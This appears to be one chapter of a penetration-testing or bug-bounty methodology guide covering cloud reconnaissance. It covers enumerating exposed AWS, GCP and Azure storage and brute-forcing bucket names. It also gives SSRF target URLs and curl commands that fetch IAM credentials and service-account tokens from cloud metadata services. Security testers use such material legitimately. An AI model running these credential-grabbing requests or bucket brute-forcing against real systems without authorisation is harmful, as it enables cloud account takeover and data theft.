# 06. Cloud Reconnaissance & Storage Auditing

Cloud assets (storage buckets, compute metadata endpoints, cloud configurations) are common vectors for high-severity exposures.

---

## Table of Contents
- [AWS Reconnaissance](#aws-reconnaissance)
- [GCP Reconnaissance](#gcp-reconnaissance)
- [Azure Reconnaissance](#azure-reconnaissance)
- [Multi-Cloud Discovery & IP Audit](#multi-cloud-discovery--ip-audit)

---

## AWS Reconnaissance

Amazon Web Services (AWS) hosts resources that are frequently misconfigured for public or authenticated access.

### S3 Bucket Identification
Buckets often share common naming conventions linked to corporate domains:
`company-assets`, `company-backup`, `company-dev`, `company-prod`, `company-logs`, `company-static`

- **[S3Scanner](https://github.com/sa7mon/S3Scanner)**: Scans buckets for public accessibility, listing ACLs and contents.
  ```bash
  s3scanner scan --bucket-file potential_buckets.txt
  ```
- **AWS CLI Verification**:
  ```bash
  # Check public access without credentials
  aws s3 ls s3://bucket-name --no-sign-request
  
  # Check access using your own AWS account credentials
  aws s3 ls s3://bucket-name
  ```

### AWS Metadata SSRF Targets
If a server running on AWS is vulnerable to Server-Side Request Forgery (SSRF), query the Instance Metadata Service (IMDS).

- **IMDSv1**:
  ```text
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
  ```
- **IMDSv2 (requires session token creation)**:
  ```bash
  TOKEN=$(curl -sX PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
  curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ -H "X-aws-ec2-metadata-token: $TOKEN"
  ```

---

## GCP Reconnaissance

Google Cloud Platform (GCP) resources can be enumerated using public API endpoints.

### GCS Buckets
Check if a Google Cloud Storage (GCS) bucket allows public read listings:
```bash
gsutil ls gs://bucket-name
```
Or check via direct HTTP requests:
```text
https://storage.googleapis.com/bucket-name/
```

- **[GCPBucketBrute](https://github.com/RhinoSecurityLabs/GCPBucketBrute)**: Bruteforce and authenticate GCP storage buckets.
  ```bash
  python3 gcpbucketbrute.py -d example.com -w wordlist.txt
  ```

### GCP Metadata SSRF Target
Ensure you supply the custom HTTP header required by Google API endpoints to access metadata:
```bash
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

---

## Azure Reconnaissance

Microsoft Azure structures resources under tenant-specific domains.

### Azure Blob Storage Enumeration
Azure blob storage follows a predictable URL format:
`https://[account-name].blob.core.windows.net/[container-name]`

- Check if a container is exposed:
  ```text
  https://[account-name].blob.core.windows.net/[container-name]?restype=container&comp=list
  ```
- **[BlobHunter](https://github.com/cyberark/BlobHunter)**: Audits Azure storage accounts for public containers.

### Azure Metadata SSRF Target
Like GCP, Azure requires an HTTP header parameter to fetch metadata:
```bash
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

---

## Multi-Cloud Discovery & IP Audit

When running port scans or looking for servers, distinguish between cloud service hosting ranges and target-owned infrastructure.

### Cloud Storage Bruteforcer
- **[CloudBrute](https://github.com/0xsha/CloudBrute)**: Multi-cloud search tool targeting AWS, GCP, and Azure assets simultaneously.
  ```bash
  cloudbrute -domain example.com -keyword example -wordlist storage_wordlist.txt
  ```

### Multi-Cloud IP Verification
Cross-reference discovered server IPs against published provider ranges:
- **AWS**: [ip-ranges.amazonaws.com/ip-ranges.json](https://ip-ranges.amazonaws.com/ip-ranges.json)
- **Azure**: [Microsoft Azure IP Ranges](https://www.microsoft.com/en-us/download/details.aspx?id=56519)
- **GCP**: [GCP IP Ranges JSON](https://www.gstatic.com/ipranges/cloud.json)
